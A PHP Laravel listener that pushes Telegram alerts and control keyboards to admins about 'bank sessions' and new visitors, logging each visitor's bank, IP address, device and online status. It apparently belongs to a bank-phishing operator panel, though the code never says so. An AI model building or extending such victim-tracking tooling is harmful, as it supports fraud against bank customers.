<?php

namespace App\Listeners;

use App\Events\BankSessionCreated;
use App\Events\BankSessionUpdated;
use App\Events\PreSessionCreated;
use App\Models\Admin;
use App\Models\PreSession;
use Illuminate\Support\Facades\Cache;
use App\Services\Telegram\TelegramCardBuilder;
use SergiX44\Nutgram\Nutgram;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardButton;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardMarkup;

class NotifyAdminsOfBankSession
{
    public function __construct(
        private readonly Nutgram $bot,
        private readonly TelegramCardBuilder $builder,
    ) {
    }

    public function handleCreated(BankSessionCreated $event): void
    {
        $session = $event->session;

        if (!Cache::add('session-created:' . $session->id, true, 60)) {
            return;
        }

        if ($session->telegram_message_id !== null) {
            $this->handleUpdated(new BankSessionUpdated($session));
            return;
        }

        $text     = $this->builder->buildCardText($session);
        $keyboard = $this->builder->buildKeyboard($session);

        $admins = Admin::where('is_active', true)
            ->get()
            ->unique('telegram_user_id');
        foreach ($admins as $admin) {
            try {
                $msg = $this->bot->sendMessage(
                    text: $text,
                    chat_id: $admin->telegram_user_id,
                    parse_mode: 'HTML',
                    reply_markup: $keyboard,
                );
                if ($session->telegram_message_id === null && $msg !== null) {
                    $session->telegram_message_id = $msg->message_id;
                    $session->telegram_chat_id    = $admin->telegram_user_id;
                    $session->save();
                }
            } catch (\Throwable $e) {
                logger()->warning('Failed to deliver card to admin', [
                    'admin_id'   => $admin->id,
                    'session_id' => $session->id,
                    'error'      => $e->getMessage(),
                ]);
            }
        }
    }

    public function handleUpdated(BankSessionUpdated $event): void
    {
        $session = $event->session;
        if ($session->telegram_chat_id === null || $session->telegram_message_id === null) {
            return;
        }
        $text = $this->builder->buildCardText($session);
        $keyboard = $this->builder->buildKeyboard($session);
        try {
            $this->bot->editMessageText(
                text: $text,
                chat_id: $session->telegram_chat_id,
                message_id: $session->telegram_message_id,
                parse_mode: 'HTML',
                reply_markup: $keyboard,
            );
        } catch (\Throwable $e) {
            logger()->warning('Failed to edit card', [
                'session_id' => $session->id,
                'error' => $e->getMessage(),
            ]);
        }
    }

    public function handlePreSession(PreSessionCreated $event): void
    {
        $preSession = $event->preSession;

        if (!Cache::add('presession-sent:' . $preSession->id, true, 60)) {
            return;
        }
        $admins     = Admin::where('is_active', true)->get()->unique('telegram_user_id');
        $ip         = $preSession->ip_address ?? '-';
        $bank       = $preSession->bank_slug ?? '-';
        $device     = $preSession->device_type === 'mobile' ? '📱 Мобильный' : '🖥️ ПК';
        $psId       = $preSession->id;

        $text = <<<HTML
🛰 <b>Новый посетитель</b>

🏦 Банк: <b>{$bank}</b>
🌍 IP: <code>{$ip}</code>
{$device}
🟢 Онлайн
HTML;

        $keyboard = InlineKeyboardMarkup::make()
            ->addRow(
                InlineKeyboardButton::make('🟢 Онлайн?', callback_data: "presession:online:{$psId}"),
            );

        foreach ($admins as $admin) {
            try {
                $msg = $this->bot->sendMessage(
                    text: $text,
                    chat_id: $admin->telegram_user_id,
                    parse_mode: 'HTML',
                    reply_markup: $keyboard,
                );
                if ($preSession->telegram_message_id === null && $msg !== null) {
                    $preSession->telegram_message_id = $msg->message_id;
                    $preSession->telegram_chat_id    = $admin->telegram_user_id;
                    $preSession->save();
                }
            } catch (\Throwable $e) {
                logger()->warning('Failed to send pre-session notification', [
                    'admin_id' => $admin->id,
                    'error'    => $e->getMessage(),
                ]);
            }
        }
    }
}
